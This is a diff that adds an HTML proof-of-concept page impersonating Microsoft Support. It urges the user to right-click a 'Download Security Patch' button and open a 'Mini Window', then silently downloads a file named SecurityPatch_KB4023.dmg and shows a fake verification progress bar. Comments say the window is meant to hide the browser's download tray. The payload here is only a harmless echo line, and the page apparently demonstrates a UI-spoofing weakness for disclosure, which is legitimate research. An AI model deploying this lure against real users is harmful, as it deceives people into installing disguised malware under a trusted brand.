@@ -1,0 +1,125 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Microsoft Support — Security Update Assistant</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Helvetica, Sans-Serif;
+            background-color: #f2f2f2;
+            margin: 0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            max-width: 500px;
+            box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+            text-align: center;
+            border-top: 4px solid #0067b8;
+        }
+        .logo { width: 120px; margin-bottom: 24px; }
+        h1 { font-size: 24px; color: #2f2f2f; margin-bottom: 12px; font-weight: 600; }
+        p { color: #616161; line-height: 1.6; margin-bottom: 30px; font-size: 14px; }
+        .btn {
+            background-color: #0067b8;
+            color: white;
+            padding: 12px 30px;
+            text-decoration: none;
+            font-weight: 600;
+            display: inline-block;
+            cursor: context-menu;
+            transition: background-color 0.2s;
+        }
+        .btn:hover { background-color: #005a9e; }
+        #status-box {
+            margin-top: 30px;
+            padding: 20px;
+            background: #e1f5fe;
+            border: 1px solid #0288d1;
+            display: none;
+            text-align: left;
+            font-size: 13px;
+            color: #01579b;
+        }
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: #ccc;
+            margin-top: 10px;
+            overflow: hidden;
+        }
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: #0067b8;
+            transition: width 0.1s linear;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg" alt="Microsoft" class="logo">
+    <h1>Security Update Recommended</h1>
+    <p>A critical update is available for your browser. To verify and install the official security patch, right-click the button below and select <b>"Open in Mini Window"</b> to authorize the Microsoft Download Manager.</p>
+    
+    <a id="download-trigger" class="btn" href="https://support.microsoft.com/en-us/windows/update-windows-3c5ae742-de3d-482c-a662-ff324be85058">
+        Download Security Patch
+    </a>
+
+    <div id="status-box">
+        <b>Microsoft Download Manager Active</b>
+        <div class="progress-bar"><div id="p-fill" class="progress-fill"></div></div>
+        <p style="margin-top: 15px;">Your update is being verified by the support portal in the Mini Window. Please check the download bubble near the address bar to complete installation.</p>
+    </div>
+</div>
+
+<script>
+    const trigger = document.getElementById('download-trigger');
+    const statusBox = document.getElementById('status-box');
+    const pFill = document.getElementById('p-fill');
+
+    trigger.addEventListener('contextmenu', () => {
+        console.log("[PoC] Starting download spoof sequence...");
+
+        // Trigger simultaneous actions
+        setTimeout(() => {
+            // 1. Silent Download of Payload
+            // Using a blob to mimic a real executable file
+            const blob = new Blob(["# Malicious Payload Demo\necho 'EXPLOTED: Malicious patch executed!'\n"], { type: "application/octet-stream" });
+            const url = window.URL.createObjectURL(blob);
+            const a = document.createElement('a');
+            a.style.display = 'none';
+            a.href = url;
+            a.download = 'SecurityPatch_KB4023.dmg'; // macOS extension
+            document.body.appendChild(a);
+            a.click();
+            window.URL.revokeObjectURL(url);
+
+            console.log("[PoC] Silent download initiated.");
+
+            // 2. UI Update
+            statusBox.style.display = 'block';
+            let width = 0;
+            const interval = setInterval(() => {
+                if (width >= 100) clearInterval(interval);
+                else {
+                    width += 1;
+                    pFill.style.width = width + "%";
+                }
+            }, 50);
+            
+            // 3. Instruction for occlusion
+            // The Mini Window (opened by user) should now be active. 
+            // The user is expected to position it near the download tray.
+            
+        }, 3500);
+    });
+</script>
+
+</body>
+</html>
